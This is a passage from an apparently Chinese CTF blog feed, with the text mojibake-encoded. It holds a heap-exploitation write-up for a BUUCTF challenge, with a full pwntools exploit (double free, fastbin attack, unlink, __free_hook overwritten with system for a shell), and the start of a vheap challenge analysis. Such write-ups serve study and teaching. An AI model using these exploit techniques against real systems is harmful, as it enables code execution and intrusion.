†åœ°å€ï¼Œç„¶åå¤šå«å‡ ä¸ªå †å—ï¼Œä¿è¯ä¿®æ”¹ä¹‹åï¼Œå †å—åœ°å€åŠ ä¸Šè‡ªèº«sizeåä¾ç„¶å¯ä»¥æ‰¾åˆ°ä¸‹ä¸€ä¸ªæ­£ç¡®çš„å †å—åœ°å€ã€‚å› ä¸ºæˆ‘ä»¬è¦å°†chunkå¤´ç”³è¯·å‡ºæ¥ï¼Œå°±æ„å‘³ç€æˆ‘ä»¬éœ€è¦ä¼ªé€ ä¸€ä¸ªsizeï¼Œå»é€šè¿‡fastbinçš„æ£€æŸ¥ã€‚<strong>ï¼ˆeditå‡½æ•°ç”¨çš„æ—¶å€™è¦æ…é‡ï¼Œæœ€åæˆ‘ä»¬æ‰“unlinkå†™å…¥åœ°å€æ—¶å°±éœ€è¦ç”¨æ‰ä¸¤ä¸ªeditå‡½æ•°çš„æœºä¼šï¼Œæ‰€ä»¥æˆ‘ä»¬å‰é¢çš„å„ç§å¸ƒå±€åªèƒ½ç”¨ä¸€æ¬¡editå‡½æ•°ï¼Œè€Œä¸”è¿™æ¬¡è‚¯å®šè¿˜æ˜¯è¦åœ¨fastin attackçš„æ—¶å€™ç”¨ï¼‰</strong></p><p>ç„¶åæˆ‘ä»¬ä¸‹é¢æ”¾ä¸‰ç§å †å—å¸ƒå±€ï¼Œåˆ†åˆ«æ˜¯æ­£å¸¸çš„å †å—Aå’Œå †å—Bï¼Œä¼ªé€ sizeï¼Œç”³è¯·chunk B headçš„å¸ƒå±€ï¼Œunlinkæ—¶çš„å †å—Aå’Œå †å—Bå¸ƒå±€</p><p><strong>æ­£å¸¸çš„å †å—Aå’Œå †å—Bå¸ƒå±€å¦‚ä¸‹ï¼š</strong></p><p><img src="/../img/2706180-20220905195256837-2078069966.png"></p><p>å› ä¸º<strong>æˆ‘ä»¬æƒ³æŠŠchunk B headç”³è¯·å‡ºæ¥ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¼ªé€ size</strong>ï¼Œå¦‚ä¸‹ï¼š</p><p>æˆ‘è§£é‡Šä¸€ä¸‹è¿™ä¸ªå›¾ï¼Œé¦–å…ˆæˆ‘ä»¬æ˜¯è¦æ§åˆ¶chunk B headï¼Œå› æ­¤æˆ‘ä»¬å…ˆæ‰“ä¸€ä¸ªdouble free+fastbin attackï¼Œå°†fake chunkï¼ˆä¹Ÿå°±æ˜¯é»‘è‰²æ¡†ä¸­çš„éƒ¨åˆ†ï¼‰ç”³è¯·å‡ºæ¥ï¼Œè¿™æ ·æˆ‘ä»¬å¾€fake chunkä¸­å†™å…¥æ•°æ®ï¼Œå°±å¯ä»¥æ§åˆ¶chunk B headäº†(å°†chunk Bçš„sizeæ”¹æˆ0xa0)ï¼Œè€Œåœ¨è¿™ä¹‹å‰æˆ‘ä»¬éœ€è¦åœ¨chunk Aä¸­çš„ç”¨æˆ·åŒºå†™å…¥0x31è¿™ä¸ªsize(å¦åˆ™æ— æ³•é€šè¿‡ä»fastbinä¸­ç”³è¯·chunkçš„æ£€æŸ¥)</p><p><img src="/../img/2706180-20220905195309452-65115390.png"></p><p>ä¸Šä¸€æ­¥å¯ä»¥æ§åˆ¶chunk B headåï¼Œæˆ‘ä»¬æŠŠchunk Bé‡Šæ”¾æ‰åï¼Œå®ƒå°±è¿›å…¥äº†unsorted binä¸­ã€‚åŒæ—¶åˆ«å¿˜è®°unlinkçš„æ¡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¤§äºfastbin èŒƒå›´çš„å †å—ä½œä¸ºå¼•çº¿å †å—ï¼Œæ‰€ä»¥é‡Šæ”¾è¿™ä¸ªchunk Bçš„æ—¶å€™ï¼Œæˆ‘ä»¬è¿˜éœ€è¦é¡ºä¾¿æ‰“ä¸€ä¸ªunlinkã€‚å¦å¤–æˆ‘ä»¬è¿˜éœ€è¦å¸ƒå±€ä¸€ä¸ªfake chunkï¼Œè¿™ä¸ªfake chunkçš„sizeè‚¯å®šè¦æ˜¯0x20ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¿®æ”¹ä¸‹chunk Aä¸­çš„user dataï¼Œä½†æ˜¯æˆ‘ä»¬ä¸èƒ½å†ç”¨editå‡½æ•°äº†ï¼Œæ‰€ä»¥è¿™é‡Œé‡‡ç”¨çš„æ–¹æ³•æ˜¯é‡Šæ”¾æ‰chunk Aï¼Œç„¶åå†ç”³è¯·å›æ¥ï¼Œå†™å…¥0x21è¿™ä¸ªsizeï¼ŒåŒæ—¶è¿˜è¦å†™å…¥ptr-0x18å’Œptr-0x10ã€‚</p><p><strong>æœ€ç»ˆçš„unlinkæ—¶å¸ƒå±€å¦‚ä¸‹</strong>ï¼š</p><p><img src="/../img/2706180-20220905195319371-1640510939.png"></p><p>emmmï¼Œåªè¦æ˜¯ç†Ÿæ‚‰unlinkçš„å¸ˆå‚…ï¼Œåº”è¯¥éƒ½èƒ½çœ‹æ‡‚ä¸Šé¢è¿™ä¸ªå¸ƒå±€ï¼Œæœ€åæä¸€ä¸‹è¿™ä¸ªfake chunkæ˜¯æ‰“fastbin attackå¼ºè¡Œé”™ä½ç”³è¯·å‡ºæ¥çš„ã€‚<u>è€Œä¸ºä»€ä¹ˆè¿™ä¸ªfake chunkçš„å¤´å¿…é¡»è¦ä»0x603010å¼€å§‹ï¼Œä¸èƒ½ä»0x603020å¼€å§‹ï¼Ÿè¿™æ˜¯å› ä¸ºchunk Bçš„åœ°å€æ˜¯å®šæ­»çš„ï¼Œè€Œå®ƒä¸Šé¢çš„å†…å­˜å•å…ƒå¿…é¡»æ˜¯ptr-0x18å’Œptr-0x10ï¼Œå¦‚æœ0x603020è¿™ä¸ªåœ°å€å½“åšfake chunk headçš„è¯ï¼Œé‚£ä¹ˆ0x603020è¿™é‡Œåº”è¯¥æ˜¯fake chunkçš„prev sizeï¼Œè¿™æ ·å°±ä¸æ˜¯ptr-0x18äº†ï¼Œæ‰€ä»¥fake chunkå¿…é¡»åœ¨0x603010çš„åœ°å€å¼€å§‹ã€‚</u></p><p>ç„¶åæ‰“ä¸€ä¸ªunlinkï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶bssæ®µå­˜æ”¾å †å—çš„åœ°å€äº†ï¼Œè€Œæ­¤æ—¶æˆ‘ä»¬è¿˜æœ‰ä¸¤æ¬¡æ‰§è¡Œeditå‡½æ•°çš„æœºä¼šã€‚ç”±äºæˆ‘ä»¬åœ¨chunk Bé‡Šæ”¾åæ‰§è¡Œshowå‡½æ•°ä¹Ÿå¾—åˆ°äº†libcåœ°å€ï¼Œå› æ­¤æˆ‘ä»¬ç›´æ¥ç”¨editå‡½æ•°å†™ä¸€ä¸ªfree_hookçš„åœ°å€åœ¨bssæ®µä¸Šï¼Œå†editå‡½æ•°å¾€é‡Œå†™ä¸€ä¸ªsystemçš„åœ°å€ã€‚æœ€åfreeæ‰ä¸€ä¸ªå­˜æœ‰&#x2F;bin&#x2F;sh\x00å­—ç¬¦ä¸²çš„å †å—å³å¯è·å–shellã€‚</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x400D7D</span></span><br><span class="line">d_a=<span class="number">0x400D59</span></span><br><span class="line">d_e=<span class="number">0x400D65</span></span><br><span class="line">d_s=<span class="number">0x400D71</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25004&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/buu64-libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment">#sleep(4)</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>+<span class="string">&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">    add(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line">    add(<span class="number">6</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    heap_addr=u64(p.recv(<span class="number">3</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(heap_addr-<span class="number">0x20</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    </span><br><span class="line">    ptr=<span class="number">0x602060</span></span><br><span class="line">    add(<span class="number">4</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>))</span><br><span class="line">    <span class="comment">#debug(p,0x400C86,d_d,d_a,d_s,d_e,0x400BD9)</span></span><br><span class="line">    add(<span class="number">5</span>,p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0xa0</span>))</span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">7</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    show(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3c4b78</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    one_gadget=search_og(<span class="number">0</span>)+libc_base</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(free_hook))</span><br><span class="line">    edit(<span class="number">0</span>,p64(sys_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220905195333982-307285379.png"></p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vheap--pwnhubäº”æœˆå…¬å¼€èµ›</title>
      <link href="/posts/b7f5642c.html"/>
      <url>/posts/b7f5642c.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>é€šè¿‡è¿™é“é¢˜çš„å­¦ä¹ ä¸æ”¶è·æœ‰:</p><p>1ã€æœ¬é¢˜çš„æ ¸å¿ƒæ˜¯åŠ«æŒ__free_hookã€‚åˆ©ç”¨memcpyæº¢å‡ºï¼Œæ›´æ”¹freeçŠ¶æ€å †å—çš„fdæŒ‡é’ˆï¼Œå°†å…¶æ”¹å†™å®Œ__free_hookçš„åœ°å€ï¼Œç„¶åç”³è¯·å›æ¥ï¼Œå†™å…¥systemåœ°å€ï¼Œæœ€ç»ˆfreeæ‰å­˜æœ‰&#x2F;bin&#x2F;shçš„å †å—è·å–shellã€‚</p><p>2ã€å­¦ä¼šäº†æ–°æŠ€èƒ½â€”â€”ä½¿ç”¨IDAæ–°å»ºç»“æ„ä½“ï¼ŒåŒæ—¶åˆ†æäº†IDAä¸­çš„å®ï¼Œé€šè¿‡å¯¹è¿™ä¸ªå®å–å­—èŠ‚çš„åˆ†æåˆåŠ æ·±äº†å¯¹æŒ‡é’ˆçš„ç†è§£<br>3ã€ä½¿ç”¨sprintfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²æ•°æ®æ—¶ï¼Œè¦è€ƒè™‘åˆ°formatåœ¨ç¬¬äºŒä¸ªå‚æ•°çš„å½±å“ï¼Œæœ€åçš„è·ç¦»æ ˆé¡¶çš„åç§»åªåŠ 5ï¼ˆå¹¶ä¸è€ƒè™‘rdiå¯„å­˜å™¨ï¼‰</p><p>4ã€åšçš„ç¬¬ä¸€é“å †é¢˜ï¼Œä½“ä¼šåˆ°äº†åœ¨å †å—ä¸­å¸ƒå±€æ¥è·å–shellçš„æ€æƒ³ã€‚</p><h2 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥:"></a>ä¿æŠ¤ç­–ç•¥:</h2><p><img src="/../img/2706180-20220514175612986-253149422.png"></p><h2 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ:"></a>ç¨‹åºåˆ†æ:</h2><h3 id="ä½¿ç”¨IDAåˆ›å»ºç»“æ„ä½“"><a href="#ä½¿ç”¨IDAåˆ›å»ºç»“æ„ä½“" class="headerlink" title="ä½¿ç”¨IDAåˆ›å»ºç»“æ„ä½“"></a>ä½¿ç”¨IDAåˆ›å»ºç»“æ„ä½“</h3><p>æ‰“å¼€æœ€åä¸€ä¸ªå‡½æ•°ï¼Œå‘ç°æ‡µæ‡µé€¼é€¼çš„ã€‚</p><p><img src="/../img/2706180-20220514175619263-121762209.png"></p><p>è¯·æ•™äº†roderickå¸ˆå‚…åæ‰çŸ¥é“è¿™é‡Œåº”è¯¥æ–°å»ºä¸€ä¸ªç»“æ„ä½“è¿›è¡Œåˆ†æï¼Œå› ä¸ºè¿™é‡Œé€šè¿‡åˆ†æå°±æ˜¯åœ¨å–32ä½æ•´æ•°çš„å››ä¸ªå­—èŠ‚ï¼ˆåˆ†æSBYTE1å’ŒSBYTE2ã€HIBYTEè¿™å‡ ä¸ªå®è§‚å¯Ÿå‡ºæ¥çš„ï¼‰ã€‚å› ä¸ºIDAç”Ÿæˆä¼ªä»£ç çš„æ—¶å€™ï¼Œå¹¶ä¸èƒ½ç™¾åˆ†ç™¾çš„ç¡®è®¤è¿™æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œæ‰€ä»¥åªèƒ½é è¿™ç§å®çš„å½¢å¼å±•ç¤ºå‡ºæ¥ï¼Œä¸ºäº†æ–¹ä¾¿åˆ†ææˆ‘ä»¬éœ€è¦æ‰‹åŠ¨æ„é€ ä¸€ä¸ªç»“æ„ä½“ã€‚</p><p>é¦–å…ˆåˆ›å»ºç»“æ„ä½“ä¹‹å‰ï¼Œå¿…é¡»è¦åˆ†æå‡ºæ¥ç»“æ„ä½“é‡Œçš„æˆå‘˜æ•°é‡å’Œç±»å‹ã€‚</p><p>è¿™ä¸ªå‡½æ•°çš„å½¢å‚æ˜¯intç±»å‹çš„a1ï¼Œè€Œä¹‹åSBYTE2å’ŒHIBYTEã€SBYTE1éƒ½æ˜¯å–çš„a1ä¸­çš„æŸä¸€å­—èŠ‚ï¼Œå› æ­¤çŒœæµ‹è¿™ä¸ªç»“æ„ä½“æ˜¯å››ä¸ªcharç±»å‹çš„å˜é‡ã€‚</p><h4 id="åˆ›å»ºç»“æ„ä½“-æ–¹æ³•1ï¼š"><a href="#åˆ›å»ºç»“æ„ä½“-æ–¹æ³•1ï¼š" class="headerlink" title="åˆ›å»ºç»“æ„ä½“ æ–¹æ³•1ï¼š"></a>åˆ›å»ºç»“æ„ä½“ æ–¹æ³•1ï¼š</h4><p><img src="/../img/2706180-20220514175624982-2031282091.png"></p><p><img src="/../img/2706180-20220514182146085-26007685.png"></p><p>ç„¶åè¾“å…¥ç»“æ„ä½“çš„åå­—</p><p><img src="/../img/2706180-20220514180610163-205234172.png"></p><p>å°†å…‰æ ‡ç‚¹åˆ°endsä¸Šï¼Œç„¶åæŒ‰d</p><p><img src="/../img/2706180-20220514180637568-1730011386.png"></p><p>å…ˆåˆ›å»ºå››ä¸ªå˜é‡ï¼Œç„¶åå°†å…‰æ ‡ç‚¹åˆ°field_0ä¸Šï¼ŒæŒ‰nï¼Œé‡å‘½å</p><p><img src="/../img/2706180-20220514180651445-1703543613.png"></p><p>æœ€åå°†å…‰æ ‡ç‚¹åˆ°å‡½æ•°åä¸Šï¼ŒæŒ‰yï¼Œç„¶åä¿®æ”¹ç¬¬äºŒä¸ªçº¢è‰²æ¡†é‡Œçš„å†…å®¹ï¼ˆæ”¹æˆç»“æ„ä½“çš„åå­—ï¼Œæˆ‘è¿™é‡Œæ˜¯æ›´æ”¹æˆvalueï¼‰</p><p><img src="/../img/2706180-20220514180703104-1762048814.png"></p><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="/../img/2706180-20220514180712905-1869244594.png"></p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼š</p><h4 id="åˆ›å»ºç»“æ„ä½“-æ–¹æ³•2ï¼š"><a href="#åˆ›å»ºç»“æ„ä½“-æ–¹æ³•2ï¼š" class="headerlink" title="åˆ›å»ºç»“æ„ä½“ æ–¹æ³•2ï¼š"></a>åˆ›å»ºç»“æ„ä½“ æ–¹æ³•2ï¼š</h4><p><img src="/../img/2706180-20220514180306157-2026482700.png" alt="image-20220513155653337"></p><p>ç„¶åå³é”®æ’å…¥</p><p><img src="/../img/2706180-20220514180305556-1203311905.png" alt="image-20220513155758601"></p><p>ç„¶åç¼–è¾‘ç»“æ„ä½“å³å¯</p><p><img src="/../img/2706180-20220514180832544-593075132.png"></p><p>æœ€åå°†åŸæœ¬çš„æ•°æ®ç±»å‹æ¢æˆå®šä¹‰å¥½çš„ç»“æ„å³å¯</p><p><img src="/../img/2706180-20220514180849983-205219515.png"></p><p><img src="/../img/2706180-20220514180901098-1038564234.png"></p><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="/../img/2706180-20220514180915039-1521065964.png"></p><p>ä¸è¿‡æ”¹å®Œä¹‹åå‘ç°è¿˜æ˜¯æ‡µæ‡µé€¼é€¼ï¼Œå› ä¸ºè¿˜æœ‰ä¸ªå¥‡æ€ªçš„qword_202D00ä¸çŸ¥é“åœ¨å¹²å˜›ã€‚æŒ‰xçœ‹ä¸€ä¸‹äº¤å‰å¼•ç”¨ï¼Œå‘ç°äº†ä¸‹é¢çš„ä»£ç </p><p><img src="/../img/2706180-20220514180927780-335719541.png"></p><p>è¿™é‡Œçœ‹èµ·æ¥æ˜¯åœ¨è¿›è¡Œåˆå§‹åŒ–ï¼Œä¸è¿‡å¹²å•¥ç”¨çš„è¿˜æ˜¯æ‡µæ‡µé€¼é€¼ã€‚roderickå¸ˆå‚…å‘Šè¯‰æˆ‘è¯´ï¼Œè¿™é‡Œå¾ªç¯äº†16ä¸ªæ¬¡ï¼Œå›æƒ³èµ·é¢˜ç›®çš„åå­—æ˜¯vheapï¼ˆè™šæ‹Ÿæœºå †é¢˜ï¼Œè¿™é“é¢˜åªæ¨¡æ‹Ÿäº†å¯„å­˜å™¨å’Œopcodeï¼‰ï¼Œå› æ­¤çŒœæµ‹è¿™é‡Œæ˜¯å°†æ‰€æœ‰çš„å¯„å­˜å™¨è¿›è¡Œäº†åˆå§‹åŒ–ã€‚å› æ­¤æˆ‘ä»¬å°†è¿™ä¸ªqword_202D68ç»™é‡å‘½åregsã€‚</p><p>æœ€åçœ‹èµ·æ¥èˆ’æœå¤šäº†ï¼Œåˆ†æç€ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ã€‚</p><p><img src="/../img/2706180-20220514180938745-1280833798.png"></p><h3 id="å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h3><p><img src="/../img/2706180-20220514180947642-1290198064.png"></p><p>å› ä¸ºå¼€äº†PIEï¼Œæƒ³å®ç°ä»»æ„å†™æ˜¯å¤Ÿå‘›äº†ï¼Œåªèƒ½åˆ©ç”¨ä¸€æ¬¡ï¼Œè€Œä¸”æ²¡æœ‰å‡†å¤‡å¥½çš„è·³æ¿ï¼Œå› æ­¤çŒœæµ‹è¿™é‡Œåº”è¯¥æ˜¯ç”¨æ¥æ³„éœ²å‡½æ•°çœŸå®åœ°å€ä»¥æ¥è·å–libcåŸºåœ°å€çš„ã€‚</p><p>ç„¶åæ­¤å¤„è¿›è¡Œäº†ä¸€æ¬¡è¾“å…¥</p><p><img src="/../img/2706180-20220514180959726-926685542.png"></p><p>æœ€å¤šè¾“å…¥2ï¼Œæ¥ä¸‹æ¥çš„å¾ªç¯æœ€å¤šè·‘ä¸‰æ¬¡ï¼Œè¿™ä¸ªå¾ªç¯æ˜¯ä»2020E0è¿™é‡Œå¼€å§‹å­˜ä¸€äº›æ•°æ®ã€‚</p><p><img src="/../img/2706180-20220514181007362-1502659209.png"></p><p>è¿™é‡Œè¾“å…¥ä¸€ä¸ªä¸å¤§äº9çš„æ•°å­—ï¼Œç„¶åå¾ªç¯ä¼šè·‘å¯¹åº”çš„æ¬¡æ•°ï¼Œä¸è¿‡è¿™é‡Œçœ‹ç€æœ‰ç‚¹æ‡µï¼Œä¸çŸ¥é“æœ‰å•¥ç”¨ï¼Œé‚£å°±ç»§ç»­å¾€ååˆ†æã€‚</p><p><img src="/../img/2706180-20220514181022124-806979207.png"></p><p>è¿™ä¸ªå‡½æ•°ä¸­çš„qword_202D78å¤„äºæ˜¯bssæ®µï¼Œå­˜æ”¾çš„æ˜¯0ï¼Œé€šè¿‡å¾ªç¯æ¯æ¬¡+1ï¼Œæœ‰ç‚¹è·Ÿè®¡æ•°å™¨ä¸€æ ·ï¼Œå»ä¸æ–­çš„æ”¹å˜V1è¿™ä¸ªç´¢å¼•ï¼Œæ¥è¿”å›ä¸åŒçš„å€¼ï¼Œç´¢å¼•æ˜¯æ ¹æ®dword_202500æ‰¾çš„ï¼Œæš‚ä¸”è®°ä¸‹ï¼Œç»§ç»­åˆ†æã€‚</p><p>æ¥ä¸‹æ¥å°±è¦åˆ†ææœ€åçš„å‡½æ•°äº†ã€‚</p><p><img src="/../img/2706180-20220514180304098-1657473361.png" alt="image-20220513201827044"></p><p>å…ˆæ˜¯è¿™ä¸ªifä¸æ˜¯å¤ªå¥½è¿‡ï¼Œå¡äº†æˆ‘å¾ˆä¹…ã€‚</p><h3 id="åˆ†æå–ä¸€å­—èŠ‚å®çš„å®ç°"><a href="#åˆ†æå–ä¸€å­—èŠ‚å®çš„å®ç°" class="headerlink" title="åˆ†æå–ä¸€å­—èŠ‚å®çš„å®ç°"></a>åˆ†æå–ä¸€å­—èŠ‚å®çš„å®ç°</h3><p>è¿™é‡Œæ¢å›åŸæœ¬çš„å®æ¥è¯´ã€‚å°±åˆ†æSBYTE1è¿™ä¸€ä¸ªå®å§ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SBYTE1(x)   SBYTEn(x,  1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SBYTEn(x, n)   (*((int8*)&amp;(x)+n))</span></span><br><span class="line"><span class="keyword">typedef</span>          <span class="type">char</span>   int8;</span><br></pre></td></tr></table></figure><p>&amp;x è¡¨ç¤ºxçš„åœ°å€</p><p>(int8 *)&amp;xè¿™ä¸ªåœ°å€è½¬æ¢æˆchar *ç±»å‹ï¼Œä¸è¿‡è¿™ä¸ªåœ°å€ä¾ç„¶ä¸å˜ï¼Œå˜çš„ä»…ä»…æ˜¯å®ƒçš„ç±»å‹</p><p>*((int8 *)&amp;x+n)   +nä»£è¡¨åœ¨åŸæœ¬çš„åœ°å€ä¸ŠåŠ nä¸ªå†…å­˜å•å…ƒçš„åç§»ï¼Œè¿™ä¸ªå†…å­˜å•å…ƒå–å†³äºä»€ä¹ˆï¼Ÿå–å†³äºæŒ‡é’ˆæŒ‡å‘çš„å˜é‡ç±»å‹ï¼Œå› ä¸ºè¢«å¼ºè½¬æˆäº†char *ï¼Œå› æ­¤ç°åœ¨çš„å˜é‡æ˜¯charç±»å‹ï¼Œæ‰€ä»¥+nå°±ç­‰åŒäºxçš„åœ°å€+nå­—èŠ‚ï¼Œæœ€ç»ˆ*å–å‡ºæŒ‡é’ˆå¯¹åº”çš„ä¸€å­—èŠ‚çš„å€¼ã€‚</p><p>ä¸ºä»€ä¹ˆè¦å¼ºè½¬æˆchar *ç±»å‹ï¼Œä¸å¼ºè½¬è¡Œä¸è¡Œï¼Ÿ</p><blockquote><p>ä¸è¡Œï¼Œå¼ºè½¬æˆchar *çš„ç›®çš„æ˜¯ä¸ºäº†åˆ†åˆ«è®¿é—®åŸæœ¬intç±»å‹å˜é‡çš„æ¯ä¸ªå­—èŠ‚ã€‚ä¸å¼ºè½¬çš„è¯ï¼Œ+nå°±ç›´æ¥è·³è¿‡äº†nä¸ªå››å­—èŠ‚çš„å†…å­˜å•å…ƒã€‚</p></blockquote><p>å› æ­¤å¾—å‡ºç»“è®ºSBYTE1çš„æ„æ€å°±æ˜¯è·å–æŒ‡å®šå˜é‡çš„ç¬¬äºŒå­—èŠ‚ï¼ˆæˆ‘æ˜¯ä»ä½åœ°å€æ•°çš„ï¼‰ã€‚ä¾æ¬¡ç±»æ¨ï¼ŒSBYTE2å°±æ˜¯è·å–ç¬¬ä¸‰å­—èŠ‚ï¼Œæˆ‘ä»¬åˆ†åˆ«åœ¨ç»“æ„ä½“ä¸­æŠŠå®ƒä»¬å‘½åä¸ºtwo_byteã€three_byteã€‚</p><p>å†æ‹è¿‡æ¥çœ‹æ£€æŸ¥ã€‚</p><p><img src="/../img/2706180-20220514180303868-1305720818.png" alt="image-20220513214802748"></p><p>è¿™ä¸ªå°±æ˜¯éœ€è¦å˜é‡a1çš„ç¬¬ä¸€å­—èŠ‚å’Œç¬¬ä¸‰å­—èŠ‚ï¼Œè¦å¤§äºç­‰äº0 å°äºç­‰äº2ã€‚çœ‹ä¸‹a1æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>ä¸€é¡¿æº¯æºä¹‹åï¼Œå‘ç°å®ƒå°±æ˜¯qword_202500é åç§»å¾—å‡ºæ¥çš„å€¼ï¼Œå†æº¯æºä¸€ä¸‹ï¼Œçœ‹çœ‹æˆ‘ä»¬æ˜¯å¦å¯¹è¿™ä¸ªqword_202500è¿›è¡Œäº†è¾“å…¥</p><p><img src="/../img/2706180-20220514181132310-878458808.png"></p><p>ä¸‹å›¾ä¸­å‘ç°äº†ï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥æ§åˆ¶dword_202500çš„å€¼ï¼Œå› 